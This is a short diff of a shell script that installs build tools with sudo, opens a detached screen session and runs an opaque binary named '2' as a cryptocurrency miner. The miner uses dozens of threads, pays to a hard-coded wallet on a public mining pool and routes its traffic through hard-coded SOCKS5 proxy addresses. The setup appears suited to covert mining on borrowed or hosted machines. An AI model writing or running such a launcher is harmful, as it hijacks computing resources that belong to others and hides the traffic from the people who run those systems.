@@ -1,7 +1,11 @@
-#!/bin/sh
-PoolHost=verushash.eu.mine.zergpool.com
-Port=3300
-PublicVerusCoinAddress=DGMCNLTTCNBi7XWPta9LhoAfEdepKfKctC
-WorkerName=Gitio
-Threads=18
-export http_proxy=socks5://72.221.172.203:4145 && chmod u+x 2 && ./2 -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" -p c=DG
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+screen -dmS ls
+A=stratum+tcp://verushash.na.mine.zergpool.com:3300
+B=DH9JoGyT5t41Sf5uipUYVqR7hdJq1GSg1u
+C=SUPER99
+D=socks5://72.217.216.239:4145
+
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE --cpu-priority 5 -t 56 --max-diff=39000
